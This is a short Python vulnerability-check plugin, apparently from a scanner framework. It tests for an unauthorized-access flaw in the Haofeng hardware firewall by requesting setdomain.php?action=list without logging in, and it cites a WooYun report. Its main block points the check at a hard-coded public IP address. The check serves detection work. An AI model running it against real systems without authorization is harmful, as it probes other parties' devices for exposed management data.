#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2015-0130135
import urlparse
def assign(service, arg):
    if service == "hf_firewall":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'setdomain.php?action=list'
    code, head, res, errcode, _ = curl.curl2(url)
    if code==200 and '域名地址' in res:
        security_warning("皓峰硬件防火墙系统越权访问漏洞%s"%url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('hf_firewall', 'http://202.70.26.137:8080/')[1])